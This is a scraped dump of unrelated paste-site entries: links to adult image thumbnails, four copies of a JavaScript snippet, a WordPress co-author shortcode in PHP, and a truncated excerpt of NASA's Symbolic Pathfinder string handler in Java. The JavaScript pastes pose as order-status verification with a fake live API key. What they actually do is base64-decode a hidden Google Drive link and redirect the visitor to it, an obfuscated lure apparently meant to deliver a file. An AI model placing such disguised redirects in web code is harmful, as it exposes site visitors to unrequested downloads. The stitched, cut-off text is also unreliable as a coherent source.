src=""https://img103.fappic.com/i/03913/ecjdt2klm5h5_t.jpg""></a><a href=""https://fappic.com/iwub8f0dl1ld/3i1891921v8z.jpg""><img src=""https://img103.fappic.com/i/03913/iwub8f0dl1ld_t.jpg""></a><a href=""https://fappic.com/56z67st2ro9t/4rqt0dslc69n.jpg""><img src=""https://img103.fappic.com/i/03913/56z67st2ro9t_t.jpg""></a><a href=""https://fappic.com/wl4xxmp9v0dm/77q35e4bwk8j.jpg""><img src=""https://img103.fappic.com/i/03913/wl4xxmp9v0dm_t.jpg""></a><a href=""https://fappic.com/0y8h43ru2ku8/ly9gecy2dapz.jpg""><img src=""https://img103.fappic.com/i/03913/0y8h43ru2ku8_t.jpg""></a><a href=""https://fappic.com/8vh0i3am4ct5/ikjj9arp1h8z.jpg""><img src=""https://img103.fappic.com/i/03913/8vh0i3am4ct5_t.jpg""></a><a href=""https://fappic.com/9dt69ksa8s9z/shj521eq6u23.jpg""><img src=""https://img103.fappic.com/i/03913/9dt69ksa8s9z_t.jpg""></a><a href=""https://fappic.com/1sz8oirwofnx/sde93fqphofw.jpg""><img src=""https://img103.fappic.com/i/03913/1sz8oirwofnx_t.jpg""></a><a href=""https://fappic.com/n8mfzmks2qi4/78k16ga5d5b4.jpg""><img src=""https://img103.fappic.com/i/03913/n8mfzmks2qi4_t.jpg""></a><a href=""https://fappic.com/guh4migdc9cy/wgyjc0q4h679.jpg""><img src=""https://img103.fappic.com/i/03913/guh4migdc9cy_t.jpg""></a><a href=""https://fappic.com/te7m95bsqax9/65lv6q2eoynu.jpg""><img src=""https://img103.fappic.com/i/03913/te7m95bsqax9_t.jpg""></a><a href=""https://fappic.com/yziss8i4ni02/der1po39gidg.jpg""><img src=""https://img103.fappic.com/i/03913/yziss8i4ni02_t.jpg""></a><a href=""https://fappic.com/mf85npdt836g/5va39agipvuv.jpg""><img src=""https://img103.fappic.com/i/03913/mf85npdt836g_t.jpg""></a><a href=""https://fappic.com/9dqsb63dr4yr/7edbcgcwa5dq.jpg""><img src=""https://img103.fappic.com/i/03913/9dqsb63dr4yr_t.jpg""></a><a href=""https://fappic.com/4zjmqagf7bpv/5vlz88kn5fh8.jpg""><img src=""https://img103.fappic.com/i/03913/4zjmqagf7bpv_t.jpg""></a><a href=""https://fappic.com/xlyyc6todcf4/z6qszuszka2w.jpg""><img src=""https://img103.fappic.com/i/03913/xlyyc6todcf4_t.jpg""></a><a href=""https://fappic.com/r9f36jc5p2ad/ks3qfsjx804h.jpg""><img src=""https://img103.fappic.com/i/03913/r9f36jc5p2ad_t.jpg""></a><a href=""https://fappic.com/73u2i3zlelba/87midu0wydsp.jpg""><img src=""https://img103.fappic.com/i/03913/73u2i3zlelba_t.jpg""></a><a href=""https://fappic.com/75ufde2e8rzj/vecqj2xt7m5y.jpg""><img src=""https://img103.fappic.com/i/03913/75ufde2e8rzj_t.jpg""></a><a href=""https://fappic.com/54ikul7eht1d/oik2by4jtwld.jpg""><img src=""https://img103.fappic.com/i/03913/54ikul7eht1d_t.jpg""></a><a href=""https://fappic.com/kb170lvvj5xl/smdmxrmslbz4.jpg""><img src=""https://img103.fappic.com/i/03913/kb170lvvj5xl_t.jpg""></a><a href=""https://fappic.com/z1jklbxvnj63/ve486yczp0nd.jpg""><img src=""https://img103.fappic.com/i/03913/z1jklbxvnj63_t.jpg""></a><a href=""https://fappic.com/v5n6aamrmau1/v3v2wlpp2jea.jpg""><img src=""https://img103.fappic.com/i/03913/v5n6aamrmau1_t.jpg""></a><a href=""https://fappic.com/vpelfs4mtzj4/junlm24vonwa.jpg""><img src=""https://img103.fappic.com/i/03913/vpelfs4mtzj4_t.jpg""></a><a href=""https://fappic.com/g888fb8ya11f/ogso1s8scfr7.jpg""><img src=""https://img103.fappic.com/i/03913/g888fb8ya11f_t.jpg""></a><a href=""https://fappic.com/5d9nlnabbnnq/t2erje9sapdh.jpg""><img src=""https://img103.fappic.com/i/03913/5d9nlnabbnnq_t.jpg""></a><a href=""https://fappic.com/syw153w1dh99/0xajqro5jtpi.jpg""><img src=""https://img103.fappic.com/i/03913/syw153w1dh99_t.jpg""></a><a href=""https://fappic.com/agj5f9fkltrd/43z11cv8wdxq.jpg""><img src=""https://img103.fappic.com/i/03913/agj5f9fkltrd_t.jpg""></a><a href=""https://fappic.com/vrawmo3lmkqi/4bh57eb04dhb.jpg""><img src=""https://img103.fappic.com/i/03913/vrawmo3lmkqi_t.jpg""></a><a href=""https://fappic.com/bnp603u3r6tv/qhv6c5tsbepv.jpg""><img src=""https://img103.fappic.com/i/03913/bnp603u3r6tv_t.jpg""></a><a href=""https://fappic.com/cyqnethmajtn/k98kl9xhau1v.jpg""><img src=""https://img103.fappic.com/i/03913/cyqnethmajtn_t.jpg""></a><a href=""https://fappic.com/j9ba3hbpn7d6/dbi7qgo0vhn8.jpg""><img src=""https://img103.fappic.com/i/03913/j9ba3hbpn7d6_t.jpg""></a><a href=""https://fappic.com/khr6ub4f59el/5n6zplmydzss.jpg""><img src=""https://img103.fappic.com/i/03913/khr6ub4f59el_t.jpg""></a>
"
BhCsnXcc,Untitled,jm33,JavaScript,Sunday 6th of April 2025 11:44:25 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/33762/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
qTheT9ay,Products.js,zebmekey,JavaScript,Sunday 6th of April 2025 11:28:57 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91890/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
G3cu7Zqv,Order.js,zebmekey,JavaScript,Sunday 6th of April 2025 11:13:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/40809/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
seqUfYYJ,Market.js,zebmekey,JavaScript,Sunday 6th of April 2025 10:58:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69870/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
B0yEZsF8,custom co authors shortcode example,arie_cristianD,PHP,Sunday 6th of April 2025 10:46:00 PM CDT,"function display_multiple_users_from_acf( $atts ) {
	global $post;

	// Get the array of users from the ACF field
	$users = get_field( 'co_author', $post->ID ); // Replace 'co_author' with your actual field name

	// Check if the data is valid
	if ( ! $users || ! is_array( $users ) ) {
		return '';
	}

	$output = '<div class=""acf-multi-user-list"">';

	foreach ( $users as $user ) {
		if ( ! is_object( $user ) ) {
			continue;
		}

		$display_name = esc_html( $user->display_name );
		$email        = esc_html( $user->user_email );
		$website      = esc_url( $user->user_url );
		$avatar       = get_avatar( $user->ID, 64 ); // Avatar size: 64px

		$output .= '<div class=""acf-user-box"" style=""margin-bottom:20px;"">';
		$output .= ""<div class='acf-user-avatar'>{$avatar}</div>"";
		$output .= ""<p><strong>Name:</strong> {$display_name}</p>"";
		$output .= ""<p><strong>Email:</strong> {$email}</p>"";
		if ( $website ) {
			$output .= ""<p><strong>Website:</strong> <a href='{$website}' target='_blank'>{$website}</a></p>"";
		}
		$output .= '</div>';
	}

	$output .= '</div>';

	return $output;
}
add_shortcode( 'acf_users_display', 'display_multiple_users_from_acf' );"
v301ehJP,SymbolicStringHandler,saifcore7,Java,Sunday 6th of April 2025 10:45:21 PM CDT,"/*
 * Copyright (C) 2014, United States Government, as represented by the
 * Administrator of the National Aeronautics and Space Administration.
 * All rights reserved.
 *
 * Symbolic Pathfinder (jpf-symbc) is licensed under the Apache License, 
 * Version 2.0 (the ""License""); you may not use this file except
 * in compliance with the License. You may obtain a copy of the License at
 * 
 *        http://www.apache.org/licenses/LICENSE-2.0. 
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an ""AS IS"" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and 
 * limitations under the License.
 */

/*  Copyright (C) 2005 United States Government as represented by the
Administrator of the National Aeronautics and Space Administration
(NASA).  All Rights Reserved.

Copyright (C) 2009 Fujitsu Laboratories of America, Inc.

DISCLAIMER OF WARRANTIES AND LIABILITIES; WAIVER AND INDEMNIFICATION

A. No Warranty: THE SUBJECT SOFTWARE IS PROVIDED ""AS IS"" WITHOUT ANY
WARRANTY OF ANY KIND, EITHER EXPRESSED, IMPLIED, OR STATUTORY,
INCLUDING, BUT NOT LIMITED TO, ANY WARRANTY THAT THE SUBJECT SOFTWARE
WILL CONFORM TO SPECIFICATIONS, ANY IMPLIED WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR FREEDOM FROM
INFRINGEMENT, ANY WARRANTY THAT THE SUBJECT SOFTWARE WILL BE ERROR
FREE, OR ANY WARRANTY THAT DOCUMENTATION, IF PROVIDED, WILL CONFORM TO
THE SUBJECT SOFTWARE. NO SUPPORT IS WARRANTED TO BE PROVIDED AS IT IS PROVIDED ""AS-IS"".

B. Waiver and Indemnity: RECIPIENT AGREES TO WAIVE ANY AND ALL CLAIMS
AGAINST FUJITSU LABORATORIES OF AMERICA AND ANY OF ITS AFFILIATES, THE
UNITED STATES GOVERNMENT, ITS CONTRACTORS AND SUBCONTRACTORS, AS WELL
AS ANY PRIOR RECIPIENT.  IF RECIPIENT'S USE OF THE SUBJECT SOFTWARE
RESULTS IN ANY LIABILITIES, DEMANDS, DAMAGES, EXPENSES OR LOSSES ARISING
FROM SUCH USE, INCLUDING ANY DAMAGES FROM PRODUCTS BASED ON, OR RESULTING
FROM, RECIPIENT'S USE OF THE SUBJECT SOFTWARE, RECIPIENT SHALL INDEMNIFY
AND HOLD HARMLESS FUJITSU LABORATORTIES OF AMERICA AND ANY OF ITS AFFILIATES,
THE UNITED STATES GOVERNMENT, ITS CONTRACTORS AND SUBCONTRACTORS, AS WELL
AS ANY PRIOR RECIPIENT, TO THE EXTENT PERMITTED BY LAW.  RECIPIENT'S SOLE
REMEDY FOR ANY SUCH MATTER SHALL BE THE IMMEDIATE, UNILATERAL
TERMINATION OF THIS AGREEMENT. */



package gov.nasa.jpf.symbc.bytecode;



import gov.nasa.jpf.symbc.numeric.*;
import gov.nasa.jpf.vm.ChoiceGenerator;
import gov.nasa.jpf.vm.ClassInfo;
import gov.nasa.jpf.vm.ClassLoaderInfo;
import gov.nasa.jpf.vm.ElementInfo;
import gov.nasa.jpf.vm.FieldInfo;
import gov.nasa.jpf.vm.Instruction;
import gov.nasa.jpf.vm.MethodInfo;
import gov.nasa.jpf.vm.SystemState;
import gov.nasa.jpf.vm.Types;
import gov.nasa.jpf.vm.VM;
import gov.nasa.jpf.vm.StackFrame;
import gov.nasa.jpf.vm.ThreadInfo;
import gov.nasa.jpf.jvm.bytecode.JVMInvokeInstruction;
import gov.nasa.jpf.symbc.mixednumstrg.SpecialRealExpression;
import gov.nasa.jpf.symbc.string.*;
import gov.nasa.jpf.symbc.mixednumstrg.*;


public class SymbolicStringHandler {
	static int handlerStep = 0;
	static Instruction handlerStepSavedNext = null;
	static Object handlerStepSavedValue = null;

	public static final int intValueOffset = 5;

	/* this method checks if a method has as argument any symbolic strings */
	
	public boolean isMethodStringSymbolic(JVMInvokeInstruction invInst, ThreadInfo th) {
		String cname = invInst.getInvokedMethodClassName();

		if (cname.equals(""java.lang.String"")
				|| cname.equals(""java.lang.StringBuilder"")
				|| cname.equals(""java.lang.StringBuffer"")
				|| cname.equals(""java.lang.CharSequence"")
				|| cname.equals(""java.lang.Appendable"")
				|| cname.equals(""java.io.PrintStream"")
				|| cname.equals(""java.lang.Integer"")
				|| cname.equals(""java.lang.Float"")
				|| cname.equals(""java.lang.Double"")
				|| cname.equals(""java.lang.Long"")
				|| cname.equals(""java.lang.Short"")
				|| cname.equals(""java.lang.Byte"")
				|| cname.equals(""java.lang.Char"")
				|| cname.equals(""java.lang.Boolean"")
				|| cname.equals(""java.lang.Object"")) {
	        
			StackFrame sf = th.getModifiableTopFrame();

			int numStackSlots = invInst.getArgSize();

			for (int i = 0; i < numStackSlots; i++) {
				Expression sym_v1 = (Expression) sf.getOperandAttr(i);
				if (sym_v1 != null) {
					if (sym_v1 instanceof SymbolicStringBuilder) { // check if
						// StringBuilder has
						// empty attribute
						if (((SymbolicStringBuilder) sym_v1).getstr() != null) {
							return true;
						}
					} else if (sym_v1 instanceof IntegerExpression && cname.equals(""java.lang.StringBuilder"")){
						//to revise
						return true;
					} else {
						return true;
					}
					
				}
			}
			return false;
		}	
		else return false;
	}

	public Instruction handleSymbolicStrings(JVMInvokeInstruction invInst, ThreadInfo th) {

		boolean needToHandle = isMethodStringSymbolic(invInst, th);

		if (needToHandle) {
			// do the string manipulations
			String mname = invInst.getInvokedMethodName();
			String shortName = mname.substring(0, mname.indexOf(""(""));
			if (shortName.equals(""concat"")) {
				Instruction handled = handleConcat(invInst, th);
				if (handled != null) {
					return handled;
				}
			} else if (shortName.equals(""equals"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()) { // first time around
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleObjectEquals(invInst, th);
					return invInst.getNext(th);
				}
			} else if (shortName.equals(""equalsIgnoreCase"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()) { // first time around
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleEqualsIgnoreCase(invInst,  th);
					return invInst.getNext(th);
				}
			} else if (shortName.equals(""endsWith"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()) { // first time around
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleEndsWith(invInst, th);
					return invInst.getNext(th);
				}
			} else if (shortName.equals(""startsWith"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()) { // first time around
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleStartsWith(invInst, th);
					return invInst.getNext(th);
				}
			} else if (shortName.equals (""contains"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()) { // first time around
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleContains(invInst, th);
					return invInst.getNext(th);
				}
			} else if (shortName.equals(""append"")) {
				Instruction handled = handleAppend(invInst, th);
				if (handled != null) {
					return handled;
				}
			} else if (shortName.equals(""length"")) {
				handleLength(invInst, th);
			} else if (shortName.equals(""indexOf"")) {
				handleIndexOf(invInst, th);
			} else if (shortName.equals(""lastIndexOf"")) {
				handleLastIndexOf(invInst, th);
			} else if (shortName.equals(""charAt"")) {
				handleCharAt (invInst, th); // returns boolean that is ignored
				//return invInst;
			} else if (shortName.equals(""replace"")) {
				Instruction handled = handleReplace(invInst, th);
				if (handled != null) {
					return handled;
				}
			} else if (shortName.equals(""replaceFirst"")) {
				Instruction handled = handleReplaceFirst(invInst, th);
				if (handled != null) {
					return handled;
				}
			} else if (shortName.equals(""trim"")) {
				handleTrim(invInst, th);
			} else if (shortName.equals(""substring"")) {
				Instruction handled = handleSubString(invInst, th);
				if (handled != null) {
					return handled;
				}
			} else if (shortName.equals(""valueOf"")) {
				Instruction handled = handleValueOf(invInst, th);
				if (handled != null) {
					return handled;
				}
			} else if (shortName.equals(""parseInt"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()) { // first time around
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleParseInt(invInst, th);
					return invInst.getNext(th);
				}
			} else if (shortName.equals(""parseFloat"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()) { // first time around
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleParseFloat(invInst, th);
					return invInst.getNext(th);
				}
			} else if (shortName.equals(""parseLong"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()) { // first time around
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleParseLong(invInst, th);
					return invInst.getNext(th);
				}
			} else if (shortName.equals(""parseDouble"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()) { // first time around
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleParseDouble(invInst, th);
					return invInst.getNext(th);
				}
			} else if (shortName.equals(""parseBoolean"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()) { // first time around
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleParseBoolean(invInst, th);
					return invInst.getNext(th);
				}
			} else if (shortName.equals(""toString"")) {
				Instruction handled = handletoString(invInst, th);
				if (handled != null) {
					return handled;
				}
			} else if (shortName.equals(""println"")) {
				handleprintln(invInst, th, true);
			} else if (shortName.equals(""print"")) {
				handleprintln(invInst, th, false);
			} else if (shortName.equals(""<init>"")) {
				Instruction handled = handleInit(invInst, th);
				if (handled != null) {
					return handled;
				} else {
					return null;
				}
			} else if (shortName.equals(""intValue"")) {
				handleintValue(invInst, th);
			} else if (shortName.equals(""floatValue"")) {
				handlefloatValue(invInst, th);
			} else if (shortName.equals(""longValue"")) {
				handlelongValue(invInst, th);
			} else if (shortName.equals(""doubleValue"")) {
				handledoubleValue(invInst, th);
			} else if (shortName.equals(""booleanValue"")) {
				handlefloatValue(invInst, th);
			} else if (shortName.equals(""isEmpty"")) {
				ChoiceGenerator<?> cg;
				if (!th.isFirstStepInsn()){
					cg = new PCChoiceGenerator(2);
					th.getVM().setNextChoiceGenerator(cg);
					return invInst;
				} else {
					handleIsEmpty(invInst, th);
					return invInst.getNext(th);
				}
			}else {
				throw new RuntimeException(""ERROR: symbolic method not handled: "" + shortName);
				//return null;
			}
			return invInst.getNext(th);
		} else {
			return null;
		}

	}

	private boolean handleCharAt (JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		IntegerExpression sym_v1 = (IntegerExpression) sf.getOperandAttr(0);
		StringExpression sym_v2 = (StringExpression) sf.getOperandAttr(1);
		boolean bresult = false;
		if ((sym_v1 == null) & (sym_v2 == null)) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleCharAt"");
		} else {
			int s1 = sf.pop();
			int s2 = sf.pop();

			IntegerExpression result = null;
			if (sym_v1 == null) { // operand 0 is concrete

				int val = s1;
				result = sym_v2._charAt(new IntegerConstant(val));
			} else {

				if (sym_v2 == null) {
					ElementInfo e1 = th.getElementInfo(s2);
					String val2 = e1.asString();
					sym_v2 = new StringConstant(val2);
					result = sym_v2._charAt(sym_v1);
				} else {
					result = sym_v2._charAt(sym_v1);
				}
				bresult = true;
				//System.out.println(""[handleCharAt] Ignoring: "" + result.toString());
				//th.push(0, false);
			}
			sf.push(0, false);
			sf.setOperandAttr(result);
		}
		return bresult; // not used

	}

	public void handleLength(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		StringExpression sym_v1 = (StringExpression) sf.getOperandAttr(0);
		if (sym_v1 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleLength"");
		} else {
			sf.pop();
			sf.push(0, false); /* dont care value for length */
			IntegerExpression sym_v2 = sym_v1._length();
			sf.setOperandAttr(sym_v2);
		}

	}

	public void handleIndexOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		int numStackSlots = invInst.getArgSize();
		if (numStackSlots == 2) {
			handleIndexOf1(invInst, th);
		} else {
			handleIndexOf2(invInst, th);
		}

	}

	/* two possibilities int, or String in parameter */
	public void handleIndexOf1(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		
		//boolean castException = false;
		StringExpression sym_v1 = null;
		Expression sym_v2 = null; // could be String or Char
		sym_v1 = (StringExpression)sf.getOperandAttr(1);
		sym_v2 = (Expression) sf.getOperandAttr(0);
		if (sym_v1 == null && sym_v2 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleIndexOf1"");
		} else {
			boolean s2char = true; //argument is char
			if (sf.isOperandRef()) {
				s2char = false; //argument is string
			}
			
			int s1 = sf.pop();
			int s2 = sf.pop();

			IntegerExpression result = null;
			if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						if (s2char) 
							result = sym_v1._indexOf((IntegerExpression)sym_v2);
						else
							result = sym_v1._indexOf((StringExpression)sym_v2);
					} else { // sym_v2 is null
						if (s2char) {
							result = sym_v1._indexOf(new IntegerConstant(s2));
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val = e2.asString();
							result = sym_v1._indexOf(new StringConstant(val));
						}
					}
			} else { // sym_v1 is null, sym_v2 must be not null
				    assert(sym_v2!=null);
					ElementInfo e1 = th.getElementInfo(s2);
					String val = e1.asString();
                    if (s2char) 
						result = new StringConstant(val)._indexOf((IntegerExpression)sym_v2);
					else
						result = new StringConstant(val)._indexOf((StringExpression)sym_v2);
			}
			sf.push(0, false);
			assert result != null;
			sf.setOperandAttr(result);


		}
	}

	/* two possibilities int, int or int, String in parameters */
	public void handleIndexOf2(JVMInvokeInstruction invInst, ThreadInfo th) {

		StackFrame sf = th.getModifiableTopFrame();

		StringExpression sym_v1 = null;
		Expression sym_v2 = null;
		IntegerExpression intExp = null;
		sym_v1 = (StringExpression) sf.getOperandAttr(2);
		intExp = (IntegerExpression) sf.getOperandAttr(0);
		sym_v2 = (Expression) sf.getOperandAttr(1);

		if (sym_v1 == null && sym_v2 == null && intExp == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleIndexOf2"");
		} else {

			int i1 = sf.pop();
			boolean s2char = true;
			if (sf.isOperandRef()) {
				//System.out.println(""[handleIndexOf2] string detected"");
				s2char = false;
			}
			
			int s2 = sf.pop();
			int s1 = sf.pop();

			IntegerExpression result = null;
			if (intExp != null) {
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						if (s2char)
							result = sym_v1._indexOf((IntegerExpression)sym_v2, intExp);
						else
							result = sym_v1._indexOf((StringExpression)sym_v2, intExp);
					} else { //sym_v2 is null
						if (s2char) {
							result = sym_v1._indexOf(new IntegerConstant(s2), intExp);
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val = e2.asString();
							result = sym_v1._indexOf(new StringConstant(val), intExp);
						}
					}
				} else { // sym_v1 is null
					ElementInfo e1 = th.getElementInfo(s1);
					String val = e1.asString();

					if (sym_v2 != null) { 
						if(s2char)
							result = new StringConstant(val)._indexOf((IntegerExpression)sym_v2, intExp);
						else
							result = new StringConstant(val)._indexOf((StringExpression)sym_v2, intExp);
					} else {
						if (s2char) {
							result = new StringConstant(val)._indexOf(new IntegerConstant(s2), intExp);
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val2 = e2.asString();
							result = new StringConstant(val)._indexOf(new StringConstant(val2), intExp);
						}
					}
				}
			}
			else { //intExp is null
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						if(s2char)
							result = sym_v1._indexOf((IntegerExpression)sym_v2, new IntegerConstant(i1));
						else
							result = sym_v1._indexOf((StringExpression)sym_v2, new IntegerConstant(i1));
					} else { //sym_v1 is null
						if (s2char) {
							result = sym_v1._indexOf(new IntegerConstant(s2), new IntegerConstant(i1));
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val = e2.asString();
							result = sym_v1._indexOf(new StringConstant(val), new IntegerConstant(i1));
							//System.out.println(""[handleIndexOf2] Special push"");
							//Special push?
							//th.push(s1, true);
						}
					}
				} else {//sym_v1 is null
					ElementInfo e1 = th.getElementInfo(s1);
					String val = e1.asString();

					if (sym_v2 != null) { 
						if(s2char)
							result = new StringConstant(val)._indexOf((IntegerExpression)sym_v2, new IntegerConstant(i1));
						else
							result = new StringConstant(val)._indexOf((StringExpression)sym_v2, new IntegerConstant(i1));
					} else {
						if (s2char) {
							result = new StringConstant(val)._indexOf(new IntegerConstant(s2), new IntegerConstant(i1));
						}
						else {
							ElementInfo e2 = th.getElementInfo(s2);
							String val2 = e2.asString();
							result = new StringConstant(val)._indexOf(new StringConstant(val2), new IntegerConstant(i1));
						}
					}
				}
			}
			sf.push(0, false);
			assert result != null;
			sf.setOperandAttr(result);

		}
	}
	
	public void handleLastIndexOf(JVMInvokeInstruction invInst, ThreadInfo th) {
		int numStackSlots = invInst.getArgSize();
		if (numStackSlots == 2) {
			handleLastIndexOf1(invInst, th);
		} else {
			handleLastIndexOf2(invInst, th);
		}
	}

	public void handleLastIndexOf1(JVMInvokeInstruction invInst, ThreadInfo th) {
		StackFrame sf = th.getModifiableTopFrame();
		//boolean castException = false;
		StringExpression sym_v1 = null;
		StringExpression sym_v2 = null;
		sym_v1 = (StringExpression) sf.getOperandAttr(1);
		/*	*/
		sym_v2 = (StringExpression) sf.getOperandAttr(0);
		if (sym_v1 == null && sym_v2 == null) {
			throw new RuntimeException(""ERROR: symbolic string method must have one symbolic operand: HandleLastIndexOf1"");
		} else {
			boolean s1char = true; //argument is char
			if (sf.isOperandRef()) {
				s1char = false; //argument is string
			}
			int s1 = sf.pop();
			int s2 = sf.pop();

			IntegerExpression result = null;
				if (sym_v1 != null) {
					if (sym_v2 != null) { // both are symbolic values
						result = sym_v1._lastIndexOf(sym_v2);
					} else {
						if (s1char) {
							result = sym_v1._lastIndexOf(new IntegerConstant(s1));
						}
						else {
							ElementInfo e2 = th.getElementInfo(s1);
							String val = e2.asString();
							result = sym_v1._lastIndexOf(new StringConstant(val));
						}
					}
				} else {//sym_v1 is null
